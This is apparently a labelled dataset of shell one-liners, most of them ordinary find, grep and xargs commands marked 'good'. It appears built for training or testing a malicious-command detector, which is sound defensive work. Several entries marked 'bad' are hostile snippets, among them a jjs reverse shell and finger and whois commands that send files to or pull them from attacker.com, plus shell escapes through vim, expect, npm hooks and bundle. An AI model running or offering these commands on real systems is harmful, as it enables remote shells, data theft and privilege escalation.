+read -rsp $'Press any key or wait 5 seconds to continue...\n' -n 1 -t 5,good
+find . -type f -print | xargs -L1 wc -l,good
+find . -name '*.php' -type f | xargs cat | wc -l,good
+find ~/ -name *.tar.gz -newer filename,good
+find -type f -exec grep -Iq . {} \; -and -print,good
+ifconfig eth0 | grep HWaddr |cut -dH -f2|cut -d\  -f2,good
+echo foo | readlink /proc/self/fd/0,good
+find ./bin -name “cp”,good
+sudo vim -c ':!/bin/sh',bad
+find . -name 'some_text_2014.08.19*',good
+"find / -type d -name ""needle""",good
+find data/ -name 'filepattern-*2009*' -exec tar uf 2009.tar '{}' +,good
+"find /raid -type d -name "".local_sd_customize"" -print",good
+"find . -name ""*"" -maxdepth 1 -exec mv -t /home/foo2/bulk2 {} +",good
+find . -type f -print0 | xargs -0 grep pattern,good
+dig +short -f list,good
+find . -type d -mtime -0 -print0 | xargs -0 mv -t /path/to/target-dir,good
+mv -f file.txt /var/lib/docker/aufs/mnt/$CONTAINER_ID/rootfs/root/file.txt,good
+find . -mtime -5,good
+find --help,good
+sudo chown -R `whoami` /usr/local/lib/node_modules,good
+"FILE=""/tmp/command_cache.`echo -n ""$KEY"" | md5sum | cut -c -10`""",good
+yash,bad
+scp -3 user@server_b:/my_folder/my_file.xml user@server_b:/my_new_folder/,good
+"PATH=$(echo $PATH | tr "":"" ""\n"" | grep -v $1 | tr ""\n"" "":"")",good
+"find / -name ""*"" — print",good
+"find /home/ -type f -regextype posix-extended -regex "".*(string1|string2|$(hostname)).*""",good
+find main-directory -type f -exec mv -v '{}' '{}'.html \;,good
+cd `cat $HOME/.lastdir`,good
+find lpi104-6 -samefile lpi104-6/file1,good
+find / -perm /711,good
+"LFILE=file_to_read
+cat ""$LFILE""",bad
+find /home/tecmint/Downloads/ -type f -exec du -Sh {} + | sort -rh | head -n 5,good
+"read -p ""Please Enter a Message: `echo $'\n> '`"" message",good
+find tmp -maxdepth 1 -name '*.mp3',good
+sleep 1,good
+find . -name 'cache*' -depth -exec rm {} \;,good
+find /myDir -type d -delete,good
+find / -type f -perm -002 -printf '%p has world write permissions\n',good
+"find ""$DIR_TO_CLEAN"" -mtime +$DAYS_TO_SAVE | wc -l",good
+find `pwd` -maxdepth 1,good
+find . -name abc -or -type d,good
+find . \( \! -user xx -exec chown -- xx '{}' + -false \),good
+"find $sourcePath -type f -mtime +10 -name ""*.log"" -exec mv {} $destPath \;",good
+find . -name *.jpg -user nobody,good
+find / -group staff -print,good
+"find . -name '*.txt' -exec echo ""{}"" \;",good
+"find . -name test -prune -regex "".*/my.*p.$""",good
+find sourceDir -mindepth 1 -type d  -print0 | xargs -0 mv --target-directory=destDir,good
+find . -type f -inum 31467125 -exec mv {} new_name.html \;,good
+"echo -ne ""Welcome `whoami`!\n""",good
+"export RHOST=attacker.com
+export RPORT=12345
+echo 'var host=Java.type(""java.lang.System"").getenv(""RHOST"");
+var port=Java.type(""java.lang.System"").getenv(""RPORT"");
+var ProcessBuilder = Java.type(""java.lang.ProcessBuilder"");
+var p=new ProcessBuilder(""/bin/bash"", ""-i"").redirectErrorStream(true).start();
+var Socket = Java.type(""java.net.Socket"");
+var s=new Socket(host,port);
+var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
+var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type(""java.lang.Thread"").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs",bad
+find /tmp -size 0 -atime +10 -exec rm -f {} \;,good
+find . -type f \( -name '*.c' -or -name '*.h' -or -name '*.cpp' \) -exec ls {} \;,good
+find /prog -type f -size +1000 -print -name core -exec rm {} \;,good
+"xelatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
+strings article.dvi",bad
+find . \! -name '.',good
+find . -name \*.php -type f -exec grep -Hn '$test' {} \+ | wc -l,good
+"echo ""$queue"" | xargs -I'{}' find {} -mindepth 1 -maxdepth 1 -type d",good
+"find ""$dir"" -name ""*.mod"" -type f -print0",good
+"bind '""\e[24~"":""\C-k \C-upwd\n""'",good
+"find . -not -name ""*.exe"" -not -name ""*.dll""",good
+find dir1 dir2 dir3 dir4 -type d -exec cp header.shtml {} \;,good
+"ls -l --color=always ""$@"" | egrep --color=never '^d|^[[:digit:]]+ d'",good
+"find . -type f -not -newermt ""$date_time""",good
+find dir/ -name '*.txt' | xargs cp -a --target-directory=dir_txt/ --parents,good
+ip=$(hostname -I),good
+find /var/ -size +10M -ls,good
+"find . -type f | xargs grep -l ""search-pattern""",good
+find / -size +900M,good
+"find /path -type f -not -name ""*.*"" -exec mv ""{}"" ""{}"".jpg \;",good
+"LFILE=file_to_write
+TF=$(mktemp)
+echo DATA > $TF
+wget -i $TF -o $LFILE",bad
+mount -t smbfs -o soft //username@server/share /users/username/smb/share,good
+chmod 640 `find ./ -type f -print`,good
+"find . -type d -name "".*""",good
+diff /destination/dir/1 /destination/dir/2 -r -x *.xml,good
+"echo ""$f"" | grep -Eo '[0-9]+[.]+[0-9]+[.]?[0-9]?' | cut -d. -f2",good
+find -type f -maxdepth 1 -name 'file*' -print0 | sort -z | xargs -0 bash script.sh,good
+"find / -type f | egrep '.*/.{1,24}$'",good
+split --lines $lines_per_file complete.out,good
+"find . -name ""orapw*"" -type f",good
+find [whatever] | xargs cat,good
+"git branch --help config
+!/bin/sh",bad
+find . -regextype posix-egrep -regex '.+\.(c|cpp|h)$' -print0 | grep -vzZ generated | grep -vzZ deploy | xargs -0 ls -1Ld,good
+find -xtype l,good
+find . | grep FooBar | xargs -I{} cp {} ~/foo/bar,good
+find . -name '*.js' -exec grep -i 'string to search for' {} \; -print,good
+"find ./polkadots -name ""image.pdf"" -print0",good
+"grep -v '^$' | paste -s -d"","" -",good
+"find . -name ""*.html"" -print",good
+comm -12 <(sort -u /home/xyz/a.csv1) <(sort -u /home/abc/tempfile) | wc -l,good
+find /data -type f -perm 400 -print -quit,good
+find . -maxdepth 1 -type f -exec rm -f {} \;,good
+sort,good
+"LFILE=file_to_read
+file -f $LFILE",bad
+"LFILE=file_to_read
+w3m ""$LFILE"" -dump",bad
+cat file-of-ips | xargs -n 1 -I ^ -P 50 ping ^,good
+"rmdir ""$(dirname $(dirname $dir))""",good
+find . -atime +7 -print,good
+find . -iname CVS -type d | xargs rm -rf,good
+"grep --exclude=*.o -rnw '/path/to/somewhere/' -e ""pattern""",good
+echo $path | rev | cut -d'/' -f-3 | rev,good
+"find . -name '*[+{;""\\=?~()<>&*|$ ]*' -exec rm -f '{}' \;",good
+grep UTRACE /boot/config-$(uname -r),good
+find  . -name '*.bak' -ls,good
+find . -type l,good
+"export LPORT=12345
+export LFILE=file_to_save
+TF=$(mktemp)
+echo 'local k=require(""socket"");
+local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
+local c=s:accept();
+local d,x=c:receive(""*a"");
+c:close();
+local f=io.open(os.getenv(""LFILE""), ""wb"");
+f:write(d);
+io.close(f);' > $TF
+nmap --script=$TF",bad
+find /usr -type f | wc -l,good
+find ~ -size +2000000c -regex '.*[^gz]' -exec gzip '{}' ';',good
+gunzip $empty_variable,good
+rm -f /tmp/stored_exception /tmp/stored_exception_line /tmp/stored_exception_source,good
+find / -perm 1551,good
+cat `which java` | file -,good
+find . -type f -mtime -7 -print -exec cat {} \; | tar cf - | gzip -9,good
+find . -size +10k -exec ls -ls {} \+ | sort -nr,good
+"find . -name ""*.jpg"" -exec ls {} +",good
+cd $(dirname `which oracle`),good
+echo $(readlink -f /dev/disk/by-uuid/$1) is not mounted,good
+ifconfig eth0 | head -n1 | tr -s ' ' | cut -d' ' -f5,good
+echo $j | read k,good
+find / -nouser -print,good
+"find $TARGET_DIR -regextype posix-extended -regex \"".*/$now.*\"" -fprint $FILE_LIST",good
+split -l 3400000,good
+find / -user root -name tecmint.txt,good
+shopt -s cdable_vars,good
+find . -name test -prune,good
+"read -p ""`echo -e '\nPlease Enter\na Message: '`"" message",good
+find . -type f -print0 | xargs -0 -n1 -P4 bzip2,good
+echo $(yes % | head -n3),good
+"find -maxdepth 1 -type d ! -name "".*""",good
+find $HOME -iname '*.ogg',good
+DayOfWeek=`date +%a |tr A-Z a-z`,good
+"LFILE=file_to_read
+hd ""$LFILE""",bad
+find . \( -name '*.svn*' -prune  -o ! -name '*.html' \) | xargs -d '\n' grep -Hd skip 'SearchString',good
+find . -type d -perm 755 -exec chmod 700 {} \;,good
+torsocks /bin/sh,bad
+join <(sort -n file1) <(sort -n file2),good
+"echo ""30 * * * * touch $(pwd)/washere2"" | crontab",good
+find -name 'messages.*' -exec grep -Iw uint {} + | grep -Ev '.svn|.git|.anythingElseIwannaIgnore',good
+echo $filename | egrep -o '[[:digit:]]{5}' | head -n1,good
+sort -b -n -k2.4 table,good
+find ./ -daystart -mtime -10 -and -mtime +1,good
+find /path/to/look/in/ -type d | grep .texturedata,good
+find . -type f -maxdepth 1 -not -empty -print0 | xargs -0i cp /dev/null {},good
+find . -name '*.java' -mtime +7 -print0 | xargs -0 grep 'swt',good
+find . -maxdepth 1 -type d -print0,good
+rm foo,good
+find /path/to/files -type f ! -newer dummyfile -delete,good
+grep foo * | nl,good
+"zcat -r /some/dir/here | grep ""blah""",good
+find /home -type d -name testdir,good
+"RHOST=attacker.com
+LFILE=file_to_send
+finger ""$(base64 $LFILE)@$RHOST""",bad
+seq $1,good
+"find -name ""123*.txt"" -exec rename 's/^123_//' {} "";""",good
+ionice /bin/sh,bad
+cp -vi /boot/config-`uname -r` .config,good
+scp -C file remote:,good
+find /home -xdev -samefile file1,good
+find . -type d -print0 | xargs -0 du | sort -n | tail -10 | cut -f2 | xargs -I{} du -sh {},good
+"pstree -a ""$PID""",good
+find . -regex filename-regex.\*\.html -exec grep -H string-to-find {} \;,good
+"find [directory] -name ""pattern_to_exclude"" -prune -o -name ""another_pattern_to_exclude"" -prune -o -name ""pattern_to_INCLUDE"" -print0 | xargs -0 -I FILENAME grep -IR ""pattern"" FILENAME",good
+find . -name '*bak' -exec rm -i {} \;,good
+"find . -name ""*.sh"" -exec ls -ld {} \;",good
+find / -mtime +31 -print,good
+find ~ -size -300b,good
+find /etc -type f -print | xargs grep -il '128\.200\.34\.',good
+tail -n +2 file.txt | split -l 20 - split_,good
+find /usr/local -type f -perm /a=x | xargs file |  grep 'not stripped' | cut -d: -f1,good
+cd /home/`whoami`,good
+find /path/to/look/in/ -type d -name '.texturedata' -exec chmod 000 {} \; -prune,good
+"find . -type f -print0 | xargs -0 grep -I ""needle text""",good
+find -daystart -mtime -7,good
+"find / -user tutonics -name ""file.txt""",good
+"find . -name ""*.png"" -prune -o -name ""*.gif"" -prune -o -name ""*.svn"" -prune -o -print0 | xargs -0 -I FILES grep -IR ""foo="" FILES",good
+find $dir -type f -name $name -print,good
+dig TXT +short o-o.myaddr.l.google.com @8.8.8.8,good
+yes | head -3,good
+"find / -name ""*conf"" -mtime 7",good
+find /data/images -newer /tmp/foo,good
+find . -regex '\./[a-f0-9\-]\{36\}\.jpg',good
+find path_to_dir -type f,good
+find . -depth -name '*.zip' -exec rm {} \;,good
+find /home/backups -type f -iregex '.*\.t?gz$' -mtime +60 -exec rm {} \;,good
+"find . -not -name ""*.exe"" -not -name ""*.dll"" -not -type d",good
+ls -l /boot/grub/*.mod | wc -l,good
+rev urllist.txt | cut -d. -f 2- | rev,good
+find dir1 ! -type d |xargs wc -c |tail -1,good
+sudo ln -f -s $javaUsrLib/jdk1*/bin/* /usr/bin/,good
+"RHOST=attacker.com
+RPORT=12345
+LFILE=file_to_save
+whois -h $RHOST -p $RPORT > ""$LFILE""",bad
+"cat files | sort -t- -k2,2 -n",good
+gzip -d --force * /etc,good
+find . -regextype posix-egrep -regex '.\*c([3-6][0-9]|70).\*',good
+"find path/ -name '*.log' -print0 | xargs -r0 grep -L ""string that should not occur""",good
+find / -path /media -prune -o -size +200000 -print,good
+"volatility -f file.dump volshell
+__import__('os').system('/bin/sh')",bad
+find . -name '*.axvw',good
+find -name *.tar.gz,good
+find . -name vmware-*.log | xargs -i rm -rf {},good
+rsync -u -r --delete dir_b dir_a,good
+du -a -h --max-depth=1 | sort -hr,good
+expect -c 'spawn /bin/sh;interact',bad
+find / -size +700M,good
+mv Tux.png .Tux.png,good
+"header=""$(curl -sI ""$1"" | tr -d '\r')""",good
+find . -type f -exec ls -s {} \; |sort -n -r |head,good
+find . -name 'my*' -type f,good
+"find . -name ""*.trc"" -ctime +3 -exec rm -f {} \;",good
+find /var/www/ -name wp-config.php -maxdepth 2,good
+TMPDIR=$(mktemp -d),good
+"find . -name ""*[1k]*""",good
+find ~/Library -name '* *' -exec ls {} \;,good
+"read -p ""`pwd -P`\$ "" _command",good
+find -type d,good
+find . -name '*.JUKEBOX.*.txt' -maxdepth 1 -print0 | xargs -0 -IFILE mv FILE ./JUKEBOX,good
+find . -size +10M,good
+find -mtime +0 -mtime -1,good
+"find /volume1/uploads -name ""*.mkv"" -exec mv \{\} \{\}.avi \;",good
+"rm -rf /usr/local/{lib/node{,/.npm,_modules},bin,share/man}/npm*",good
+find . -type f -print0,good
+find / -type d | wc -l,good
+"TF=$(mktemp -d)
+touch $TF/Gemfile
+cd $TF
+bundle exec /bin/sh",bad
+sudo rm /var/lib/mongodb/mongod.lock,good
+find . -uid 120 -print,good
+"TF=$(mktemp -d)
+echo '{""scripts"": {""preinstall"": ""/bin/sh""}}' > $TF/package.json
+npm -C $TF i",bad
